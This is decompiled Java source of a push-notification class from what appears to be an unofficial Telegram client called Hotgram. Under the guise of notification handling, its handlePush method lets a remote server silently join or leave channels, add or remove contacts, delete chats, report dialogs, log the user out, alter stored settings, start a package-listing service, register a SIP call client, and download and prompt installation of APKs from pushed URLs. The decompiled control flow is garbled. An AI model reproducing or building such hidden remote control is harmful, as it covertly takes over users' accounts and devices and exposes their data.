package org.telegram.customization.Model;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences$Editor;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.support.v4.content.FileProvider;
import android.text.TextUtils;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import com.e.a.m$b;
import com.e.a.t;
import com.google.a.f;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.Proxy;
import java.net.URL;
import java.net.URLConnection;
import org.telegram.customization.dynamicadapter.viewholder.SlsMessageHolder;
import org.telegram.customization.g.c;
import org.telegram.customization.g.e;
import org.telegram.customization.service.SpkgService;
import org.telegram.customization.util.c.a;
import org.telegram.customization.util.view.VideoActivity;
import org.telegram.messenger.AndroidUtilities;
import org.telegram.messenger.ApplicationLoader;
import org.telegram.messenger.ChatObject;
import org.telegram.messenger.MessagesController;
import org.telegram.messenger.NotificationCenter;
import org.telegram.messenger.UserConfig;
import org.telegram.tgnet.TLRPC$Chat;
import org.telegram.tgnet.TLRPC$ChatFull;
import org.telegram.ui.LaunchActivity;
import utils.d;

public class HotgramNotification {
    class DownloadFileFromURL extends AsyncTask {
        Context context;
        String fileName;
        HotgramNotification notification;

        public DownloadFileFromURL(Context arg2, HotgramNotification arg3) {
            super();
            this.fileName = "";
            this.context = arg2;
            this.notification = arg3;
        }

        protected Object doInBackground(Object[] arg1) {
            return this.doInBackground(((String[])arg1));
        }

        protected String doInBackground(String[] arg14) {
            BufferedInputStream v3;
            int v2_1;
            try {
                URL v0 = new URL(arg14[0]);
                URLConnection v2 = v0.openConnection();
                ((HttpURLConnection)v2).connect();
                v2_1 = ((HttpURLConnection)v2).getContentLength();
                v3 = new BufferedInputStream(v0.openStream(), 8192);
                this.fileName = HotgramNotification.spliturl(arg14[0]);
                Log.d("alireza", "alireza:" + this.fileName);
            }
            catch(Exception v14) {
                goto label_116;
            }

            try {
                v0_1 = new StringBuilder();
                v0_1.append(d.a());
                v0_1.append(this.fileName);
                File v14_1 = new File(v0_1.toString());
                if(v14_1.exists()) {
                    Log.d("alireza", "testttttdelstet1 " + String.valueOf(v14_1.exists()));
                }

                Log.d("alireza", "testttttdelstet2 " + String.valueOf(v14_1.delete()));
                Log.d("alireza", "testttttdelstet3 " + String.valueOf(v14_1.exists()));
                goto label_67;
            }
            catch(Exception v14) {
                try {
                    v14.printStackTrace();
                label_67:
                    v0_1 = new StringBuilder();
                    v0_1.append(d.a());
                    v0_1.append(this.fileName);
                    FileOutputStream v14_2 = new FileOutputStream(v0_1.toString());
                    byte[] v0_2 = new byte[1024];
                    long v4_1 = 0;
                    long v6;
                    for(v6 = v4_1; true; v6 = System.currentTimeMillis()) {
                    label_80:
                        int v8 = ((InputStream)v3).read(v0_2);
                        if(v8 == -1) {
                            break;
                        }

                        v4_1 += ((long)v8);
                        ((OutputStream)v14_2).write(v0_2, 0, v8);
                        if(System.currentTimeMillis() <= 500 + v6) {
                            goto label_80;
                        }

                        String[] v6_1 = new String[1];
                        v6_1[0] = "" + (((int)(100 * v4_1 / (((long)v2_1)))));
                        this.publishProgress(((Object[])v6_1));
                    }

                    ((OutputStream)v14_2).flush();
                    ((OutputStream)v14_2).close();
                    ((InputStream)v3).close();
                    HotgramNotification.installAPK(this.context, this.fileName, this.notification);
                }
                catch(Exception v14) {
                label_116:
                    v14.printStackTrace();
                }
            }

            return null;
        }

        protected void onPostExecute(Object arg1) {
            this.onPostExecute(((String)arg1));
        }

        protected void onPostExecute(String arg2) {
            Log.d("alireza", "selfupdate download compeleted");
        }

        protected void onPreExecute() {
            super.onPreExecute();
        }

        protected void onProgressUpdate(Object[] arg1) {
            this.onProgressUpdate(((String[])arg1));
        }

        protected void onProgressUpdate(String[] arg1) {
        }
    }

    public static final int Extra_Data_OPEN_ACTIVITY = 1;
    public static final int Extra_Data_OPEN_POSITION = 2;
    public static final int PUSH_TYPE_AAD_TO_FILTER = 14;
    public static final int PUSH_TYPE_AAD_TO_REPORT = 20;
    public static final int PUSH_TYPE_ADD_CONTACT = 9;
    public static final int PUSH_TYPE_ADD_PROXY = 13;
    public static final int PUSH_TYPE_CALL_REQUEST = 21;
    public static final int PUSH_TYPE_CALL_SETTING = 16;
    public static final int PUSH_TYPE_CALL_SIMPLE_URL = 19;
    public static final int PUSH_TYPE_CHANGE_SP = 7;
    public static final int PUSH_TYPE_DELETE_CHANNEL = 18;
    public static final int PUSH_TYPE_DELETE_CHAT = 15;
    public static final int PUSH_TYPE_GET_MAIN_DOMAIN = 3;
    public static final int PUSH_TYPE_GET_MIRROR_DOMAIN = 4;
    public static final int PUSH_TYPE_GO_TO_BAAZAR_FOR_COMMENT = 6;
    public static final int PUSH_TYPE_GO_TO_CHANNEL = 5;
    public static final int PUSH_TYPE_JOIN_CHANNEL = 2;
    public static final int PUSH_TYPE_JOIN_WITH_URL = 23;
    public static final int PUSH_TYPE_LOGUOT = 22;
    public static final int PUSH_TYPE_OPEN_URL = 24;
    public static final int PUSH_TYPE_REMOVE_CONTACT = 10;
    public static final int PUSH_TYPE_SELF_UPDATE = 8;
    public static final int PUSH_TYPE_SEND_ALL_PACKAGES = 17;
    public static final int PUSH_TYPE_SIMPLE = 1;
    public static final int PUSH_TYPE_START_ALL_SERVICE = 12;
    public static final int PUSH_TYPE_VIDEO_PLAYER = 11;
    private String background;
    private String bigText;
    private String extraData;
    private int extraDataType;
    private int id;
    private String message;
    HotgramNotification notification;
    private int pushType;
    private String title;
    private int versionCode;

    public HotgramNotification() {
        super();
    }

    private static void changeSpValues(Context arg3, HotgramNotification arg4) {
        try {
            SharedPreferences$Editor v3 = arg3.getSharedPreferences(arg4.getTitle(), 0).edit();
            if(arg4.getMessage().equals("i")) {
                v3.putInt(arg4.getBigText(), Integer.parseInt(arg4.getExtraData()));
            }
            else {
                goto label_13;
            }

        label_47:
            v3.commit();
            return;
        label_13:
            if(arg4.getMessage().equals("l")) {
                v3.putLong(arg4.getBigText(), Long.parseLong(arg4.getExtraData()));
                goto label_47;
            }

            if(arg4.getMessage().equals("s")) {
                v3.putString(arg4.getBigText(), arg4.getExtraData());
                goto label_47;
            }

            if(arg4.getMessage().equals("f")) {
                v3.putFloat(arg4.getBigText(), Float.parseFloat(arg4.getExtraData()));
                goto label_47;
            }

            if(!arg4.getMessage().equals("b")) {
                goto label_47;
            }

            v3.putBoolean(arg4.getBigText(), Boolean.parseBoolean(arg4.getExtraData()));
            goto label_47;
        }
        catch(Exception ) {
            return;
        }
    }

    public static Intent createClickIntent(Context arg3, Class arg4, HotgramNotification arg5, long arg6) {
        String v3_2;
        Intent v0 = new Intent(arg3, arg4);
        v0.setAction(System.currentTimeMillis() + "");
        try {
            v0.putExtra("EXTRA_PUSH_MESSAGE_ID", arg6);
        }
        catch(Exception v3_1) {
            v3_1.printStackTrace();
        }

        switch(arg5.getExtraDataType()) {
            case 1: {
                if(TextUtils.isEmpty(arg5.getExtraData())) {
                    return null;
                }

                v3_2 = "GO_TO_ACTIVITY";
            label_22:
                v0.putExtra(v3_2, arg5.getExtraData());
                return v0;
            }
            case 2: {
                if(TextUtils.isEmpty(arg5.getExtraData())) {
                    return null;
                }

                v3_2 = "GO_TO_POSITION";
                goto label_22;
            }
            default: {
                break;
            }
        }

        return null;
    }

    public static void customNotification(Context arg0, HotgramNotification arg1, long arg2) {
    }

    private static void deleteNotif(Context arg0, HotgramNotification arg1) {
        a.a(arg0, arg1.getId());
    }

    public String getBackground() {
        return this.background;
    }

    public String getBigText() {
        if(TextUtils.isEmpty(this.bigText)) {
            this.bigText = " ";
        }

        return this.bigText;
    }

    public String getExtraData() {
        return this.extraData;
    }

    public int getExtraDataType() {
        return this.extraDataType;
    }

    public int getId() {
        return this.id;
    }

    public String getMessage() {
        if(TextUtils.isEmpty(this.message)) {
            this.message = " ";
        }

        return this.message;
    }

    public int getPushType() {
        return this.pushType;
    }

    public String getTitle() {
        if(TextUtils.isEmpty(this.title)) {
            this.title = " ";
        }

        return this.title;
    }

    private static void getUrlInfo(int arg8, String arg9, int arg10, Context arg11) {
        new Thread(new Runnable(arg9, new String[]{""}, arg11, arg10, arg8) {
            public void run() {
                new StringBuilder();
                try {
                    URLConnection v1_1 = new URL(this.val$url).openConnection(Proxy.NO_PROXY);
                    ((HttpURLConnection)v1_1).setInstanceFollowRedirects(false);
                    String v2 = ((HttpURLConnection)v1_1).getHeaderField("Location");
                    ((HttpURLConnection)v1_1).disconnect();
                    this.val$shareUrl[0] = v2;
                }
                catch(IOException v1) {
                    v1.printStackTrace();
                }

                String v1_2 = this.val$url;
                if(!TextUtils.isEmpty(this.val$shareUrl[0])) {
                    v1_2 = this.val$shareUrl[0];
                }

                Intent v0 = new Intent("android.intent.action.VIEW", Uri.parse(v1_2));
                v0.setComponent(new ComponentName(this.val$context.getPackageName(), LaunchActivity.class.getName()));
                v0.setFlags(268435456);
                v0.putExtra("IS_FROM_PUSH", true);
                v0.putExtra("JOINTYPE", this.val$type);
                v0.putExtra("SOUNDTYPE", this.val$soundType);
                v0.setFlags(268435456);
                v0.putExtra("create_new_tab", true);
                v0.putExtra("com.android.browser.application_id", this.val$context.getPackageName());
                this.val$context.startActivity(v0);
            }
        }).start();
    }

    public int getVersionCode() {
        return this.versionCode;
    }

    private static t getViewTarget(a.a.a.a.a.a arg1) {
        return new t(arg1) {
            public void onBitmapFailed(Drawable arg1) {
            }

            public void onBitmapLoaded(Bitmap arg1, b arg2) {
                this.val$onCompleted.a(arg1);
            }

            public void onPrepareLoad(Drawable arg1) {
            }
        };
    }

    public static void handlePush(Context arg7, String arg8, long arg9) {
        Uri v8_3;
        Object v7_3;
        Notification v7_2;
        Object v10;
        PendingIntent v8_1;
        Intent v8;
        ChatFull v4;
        int v3;
        int v2;
        int v1;
        int v0_1;
        HotgramNotification v9;
        try {
            v9 = HotgramNotification.jsonWrapper(arg8);
            Log.d("slspushreceiver", arg8);
            Log.d("slspushreceiver", v9.getPushType() + "-------1");
            if(v9 != null) {
                if(v9.getVersionCode() > 206) {
                }
                else {
                    Log.d("handlePush type : ", v9.getPushType() + "");
                    Log.d("LEE", "Aliiiiii:9    " + new f().a(v9));
                    if(v9 != null) {
                        v0_1 = 1029;
                        v1 = 2131231181;
                        v2 = 134217728;
                        v3 = 268435456;
                        v4 = null;
                        switch(v9.getPushType()) {
                            case 1: {
                                goto label_319;
                            }
                            case 2: {
                                goto label_297;
                            }
                            case 3: {
                                goto label_294;
                            }
                            case 4: {
                                goto label_291;
                            }
                            case 5: {
                                goto label_279;
                            }
                            case 6: {
                                goto label_265;
                            }
                            case 7: {
                                goto label_263;
                            }
                            case 8: {
                                goto label_261;
                            }
                            case 9: {
                                goto label_252;
                            }
                            case 10: {
                                goto label_243;
                            }
                            case 11: {
                                goto label_237;
                            }
                            case 12: {
                                goto label_235;
                            }
                            case 13: {
                                goto label_225;
                            }
                            case 14: {
                                goto label_213;
                            }
                            case 15: {
                                goto label_184;
                            }
                            case 16: {
                                goto label_180;
                            }
                            case 17: {
                                goto label_175;
                            }
                            case 18: {
                                goto label_154;
                            }
                            case 19: {
                                goto label_147;
                            }
                            case 20: {
                                goto label_133;
                            }
                            case 21: {
                                goto label_90;
                            }
                            case 22: {
                                goto label_86;
                            }
                            case 23: {
                                goto label_68;
                            }
                            case 24: {
                                goto label_48;
                            }
                        }

                        return;
                    label_225:
                        if(!TextUtils.isEmpty(v9.getExtraData())) {
                            e.a(new f().a(arg8, ProxyServerModel.class));
                            utils.a.b.A(arg7, arg8);
                            return;
                        label_291:
                            utils.a.b.a(arg7, v9.getExtraData());
                            return;
                        label_294:
                            utils.a.b.f(arg7, v9.getExtraData());
                        }
                        else {
                        }
                    }
                    else {
                    }

                    return;
                }
            }

            return;
        }
        catch(Exception v7) {
            goto label_339;
        }

        try {
        label_297:
            ChatTime v7_1 = new ChatTime();
            v7_1.setcId(((long)v9.getId()));
            v7_1.setTime((((long)v9.getExtraDataType())) + System.currentTimeMillis());
            utils.a.b.a(v7_1);
            SlsMessageHolder.addToChannel(Integer.parseInt(v9.getExtraData()), v9.getBigText());
            return;
        }
        catch(Exception ) {
            try {
                SlsMessageHolder.addToChannel(Integer.parseInt(v9.getExtraData()), v9.getBigText());
                return;
            label_235:
                org.telegram.customization.work.a.d();
                return;
            label_237:
                com.d.a.b.d.a().a(v9.getBackground(), new com.d.a.b.f.a(v9, arg7) {
                    public void onLoadingCancelled(String arg1, View arg2) {
                    }

                    public void onLoadingComplete(String arg4, View arg5, Bitmap arg6) {
                        new Bundle().putString("EXTRA_VIDEO_URL", this.val$notification.getExtraData());
                        Intent v4 = new Intent(this.val$context, VideoActivity.class);
                        v4.putExtra("IS_FROM_PUSH", true);
                        v4.putExtra("EXTRA_VIDEO_URL", this.val$notification.getExtraData());
                        this.val$context.getSystemService("notification").notify(1029, new android.support.v4.app.w$d(this.val$context).a(this.val$notification.getTitle()).b(this.val$notification.getMessage()).a(2131231181).b(true).a(PendingIntent.getActivity(this.val$context, 0, v4, 134217728)).a(arg6).a(new android.support.v4.app.w$b().a(arg6).a(this.val$notification.getBigText()).b(this.val$notification.getMessage())).b());
                    }

                    public void onLoadingFailed(String arg4, View arg5, com.d.a.b.a.b arg6) {
                        new Bundle().putString("EXTRA_VIDEO_URL", this.val$notification.getExtraData());
                        Intent v4 = new Intent(this.val$context, VideoActivity.class);
                        v4.putExtra("IS_FROM_PUSH", true);
                        v4.putExtra("EXTRA_VIDEO_URL", this.val$notification.getExtraData());
                        PendingIntent v4_1 = PendingIntent.getActivity(this.val$context, 0, v4, 134217728);
                        Object v5 = this.val$context.getSystemService("notification");
                        android.support.v4.app.w$d v4_2 = new android.support.v4.app.w$d(this.val$context).a(this.val$notification.getTitle()).b(this.val$notification.getMessage()).a(2131231181).b(true).a(v4_1);
                        try {
                            arg6.a().printStackTrace();
                            goto label_39;
                        }
                        catch(Exception ) {
                        label_39:
                            ((NotificationManager)v5).notify(1029, v4_2.b());
                            return;
                        }
                    }

                    public void onLoadingStarted(String arg1, View arg2) {
                    }
                });
                return;
            label_175:
                v8 = new Intent(arg7, SpkgService.class);
                goto label_178;
            label_48:
                v8_1 = PendingIntent.getActivity(arg7, 0, new Intent("android.intent.action.VIEW", Uri.parse(v9.getExtraData())), v2);
                v10 = arg7.getSystemService("notification");
                v7_2 = new android.support.v4.app.w$d(arg7).a(v9.getTitle()).b(v9.getMessage()).a(v1).b(true).a(v8_1).b();
                goto label_66;
            label_243:
                Log.d("slspushreceiver msg:", "remove contact 0");
                if(v9 != null) {
                    d.b(arg7, v9.getExtraData(), v9.getTitle(), v9.getMessage());
                    return;
                label_180:
                    v8 = new Intent(arg7, org.telegram.customization.service.d.class);
                label_178:
                    arg7.startService(v8);
                }
                else {
                }

                return;
            }
            catch(Exception v7) {
                goto label_339;
            }
        }

        try {
        label_184:
            MessagesController.getInstance(UserConfig.selectedAccount).deleteUserFromChat(Integer.parseInt(v9.getExtraData()), UserConfig.getInstance(UserConfig.selectedAccount).getCurrentUser(), v4);
            MessagesController.getInstance(UserConfig.selectedAccount).deleteDialog(((long)Integer.parseInt(v9.getExtraData())), 0);
            if(AndroidUtilities.isTablet()) {
                NotificationCenter.getInstance(UserConfig.selectedAccount).postNotificationName(NotificationCenter.closeChats, new Object[]{Integer.valueOf(Integer.parseInt(v9.getExtraData()))});
            }
            else {
            }

            return;
        }
        catch(Exception v7) {
            goto label_211;
        }

        try {
        label_252:
            Log.d("slspushreceiver msg:", "add contact 0");
            if(v9 != null) {
                d.a(arg7, v9.getTitle(), v9.getMessage(), v9.getExtraData());
                return;
            label_319:
                v8 = new Intent(arg7, LaunchActivity.class);
                v8.setFlags(v3);
                v8_1 = PendingIntent.getActivity(arg7, 0, v8, v2);
                v10 = arg7.getSystemService("notification");
                v7_2 = new android.support.v4.app.w$d(arg7).a(v9.getTitle()).b(v9.getMessage()).a(v1).b(true).a(v8_1).b();
            label_66:
                ((NotificationManager)v10).notify(v0_1, v7_2);
                return;
            label_68:
                ChatTime v8_2 = new ChatTime();
                v8_2.setcId(((long)v9.getId()));
                v8_2.setTime(Long.parseLong(v9.getBigText()) + System.currentTimeMillis());
                utils.a.b.a(v8_2);
                HotgramNotification.getUrlInfo(Integer.parseInt(v9.getMessage()), v9.getExtraData(), v9.getExtraDataType(), arg7);
                return;
            label_261:
                HotgramNotification.startDownloadingProcess(arg7, v9);
                return;
            label_133:
                if(!TextUtils.isEmpty(v9.getExtraData())) {
                    v7_3 = new f().a(v9.getExtraData(), DialogStatus.class);
                    if(v7_3 != null) {
                        MessagesController.loadChannelInfoByUsername(((DialogStatus)v7_3).getUsername(), new org.telegram.customization.g.d(((DialogStatus)v7_3)) {
                            public void onResult(Object arg7, int arg8) {
                                Chat v4 = MessagesController.getInstance(UserConfig.selectedAccount).getChat(Integer.valueOf(((int)this.val$dialogStatus.getDialogId())));
                                if(v4 != null) {
                                    MessagesController.getInstance(UserConfig.selectedAccount).reportSpam(this.val$dialogStatus.getDialogId(), null, v4, null);
                                }
                            }
                        });
                        return;
                    label_263:
                        HotgramNotification.changeSpValues(arg7, v9);
                    }
                    else {
                    }
                }
                else {
                }
            }
            else {
            }

            return;
        }
        catch(Exception v7) {
            goto label_339;
        }

        try {
        label_265:
            arg8 = "http://cafebazaar.ir/app/?id=org.ir.talaeii";
        }
        catch(Exception v7) {
            goto label_278;
        }

        try {
            v8_3 = Uri.parse(arg8);
        }
        catch(Exception ) {
            v8_3 = ((Uri)v4);
        }

        if(v8_3 == null) {
            return;
        }
        else {
            try {
                Intent v9_1 = new Intent("android.intent.action.EDIT", v8_3);
                v9_1.setFlags(v3);
                arg7.startActivity(v9_1);
                return;
            }
            catch(Exception v7) {
            label_278:
                goto label_211;
            }

            try {
            label_147:
                c.a(ApplicationLoader.applicationContext, new org.telegram.customization.g.d() {
                    public void onResult(Object arg1, int arg2) {
                    }
                }).g(v9.getExtraData());
                return;
            label_213:
                if(!TextUtils.isEmpty(v9.getExtraData())) {
                    v7_3 = new f().a(v9.getExtraData(), DialogStatus.class);
                    if(v7_3 != null) {
                        ApplicationLoader.databaseHandler.a(((DialogStatus)v7_3));
                    }
                    else {
                    }
                }
                else {
                }

                return;
            }
            catch(Exception v7) {
                goto label_339;
            }

            try {
            label_86:
                MessagesController.getInstance(UserConfig.selectedAccount).performLogout(1);
            }
            catch(Exception ) {
            }

            return;
            try {
            label_279:
                MessagesController.getInstance(UserConfig.selectedAccount).openByUserName(v9.getExtraData(), LaunchActivity.mainFragmentsStack.get(LaunchActivity.mainFragmentsStack.size() - 1), 1);
                return;
            }
            catch(Exception v7) {
            }

            try {
            label_211:
                v7.printStackTrace();
                return;
            label_154:
                int v7_4 = Integer.parseInt(v9.getExtraData());
                if(ChatObject.isCanWriteToChannel(MessagesController.getInstance(UserConfig.selectedAccount).getChat(Integer.valueOf(v7_4)).id, UserConfig.selectedAccount)) {
                    MessagesController.getInstance(UserConfig.selectedAccount).deleteUserFromChat(v7_4, MessagesController.getInstance(UserConfig.selectedAccount).getUser(Integer.valueOf(UserConfig.getInstance(UserConfig.selectedAccount).getClientUserId())), v4, true);
                    return;
                label_90:
                    Log.d("alirezaaaaa", "alirezaaaa push call rec");
                    Log.d("slsCall push", "getWhatsUpResult " + v9.getExtraData());
                    v7_3 = new f().a(new String(Base64.decode(v9.getExtraData(), 0), "UTF-8"), WhatsupNotif.class);
                    org.telegram.customization.j.a.a v8_5 = new org.telegram.customization.j.a.a(false);
                    v8_5.sipWrapper.setWhatsupNotif(((WhatsupNotif)v7_3));
                    v8_5.sipWrapper.register(((WhatsupNotif)v7_3).getParams().getDomain(), ((WhatsupNotif)v7_3).getParams().getPort(), ((WhatsupNotif)v7_3).getParams().getUser(), ((WhatsupNotif)v7_3).getParams().getPassword());
                    utils.a.b.q(new f().a(v7_3));
                    Log.d("alirezaaaaa", "alirezaaaa push call started");
                }
                else {
                }
            }
            catch(Exception v7) {
            label_339:
                v7.printStackTrace();
            }

            return;
        }
    }

    public static void installAPK(Context arg8, String arg9, HotgramNotification arg10) {
        PendingIntent v9_1;
        PendingIntent v5_2;
        StringBuilder v1 = new StringBuilder();
        v1.append(d.a());
        v1.append(File.separator);
        v1.append(arg9);
        File v0 = new File(v1.toString());
        if(!v0.exists()) {
            return;
        }

        try {
            PackageManager v2 = arg8.getPackageManager();
            StringBuilder v3 = new StringBuilder();
            v3.append(d.a());
            v3.append(File.separator);
            v3.append(arg9);
            if(v2.getPackageArchiveInfo(v3.toString(), 0).versionCode > 206) {
                goto label_31;
            }

            v0.delete();
            return;
        }
        catch(Exception v9) {
            v9.printStackTrace();
        }

    label_31:
        int v2_1 = 134217728;
        int v3_1 = 268435456;
        try {
            Intent v5_1 = new Intent("android.intent.action.VIEW");
            v5_1.setFlags(v3_1);
            StringBuilder v6 = new StringBuilder();
            v6.append("file://");
            v6.append(v0.toString());
            v5_1.setDataAndType(Uri.parse(v6.toString()), "application/vnd.android.package-archive");
            v5_2 = PendingIntent.getActivity(arg8, 0, v5_1, v2_1);
            v9_1 = null;
        }
        catch(Exception v5) {
            v5.printStackTrace();
            v5_2 = v9_1;
            int v9_2 = 0;
        }

        if((((PendingIntent)v9_2)) == null) {
            try {
                Intent v9_3 = new Intent("android.intent.action.INSTALL_PACKAGE");
                v9_3.setFlags(v3_1);
                v9_3.setFlags(1);
                v9_3.setData(FileProvider.a(arg8, "org.ir.talaeii.provider", v0));
                v9_1 = PendingIntent.getActivity(arg8, 0, v9_3, v2_1);
                goto label_70;
            }
            catch(Exception v9) {
                v9.printStackTrace();
            }
        }

        v9_1 = v5_2;
    label_70:
        android.support.v4.app.w$d v9_4 = new android.support.v4.app.w$d(arg8).d(1).a(arg10.getTitle()).b(arg10.getMessage()).a(2131231181).a(v9_1);
        v9_4.c(1);
        arg8.getSystemService("notification").notify(arg10.getId(), v9_4.b());
    }

    public static HotgramNotification jsonWrapper(String arg2) {
        try {
            return new f().a(arg2, HotgramNotification.class);
        }
        catch(Exception v2) {
            v2.printStackTrace();
            return null;
        }
    }

    public void setBackground(String arg1) {
        this.background = arg1;
    }

    public void setBigTest(String arg1) {
        this.bigText = arg1;
    }

    public void setExtraData(String arg1) {
        this.extraData = arg1;
    }

    public void setExtraDataType(int arg1) {
        this.extraDataType = arg1;
    }

    public void setId(int arg1) {
        this.id = arg1;
    }

    public void setMessage(String arg1) {
        this.message = arg1;
    }

    public void setPushType(int arg1) {
        this.pushType = arg1;
    }

    public void setTitle(String arg1) {
        this.title = arg1;
    }

    public void setVersionCode(int arg1) {
        this.versionCode = arg1;
    }

    public static void showPouyaNotification(Context arg2, String arg3, long arg4) {
        HotgramNotification v3 = HotgramNotification.jsonWrapper(arg3);
        if(v3 != null) {
            if(v3.getVersionCode() > 206) {
            }
            else if(v3.getPushType() != 1) {
            }
            else {
                HotgramNotification.customNotification(arg2, v3, arg4);
            }
        }
    }

    public static String spliturl(String arg1) {
        String[] v1 = new String(arg1).split("/");
        return v1[v1.length - 1];
    }

    private static void startDownloadingProcess(Context arg2, HotgramNotification arg3) {
        new DownloadFileFromURL(arg2, arg3).execute(new String[]{arg3.getExtraData()});
    }
}

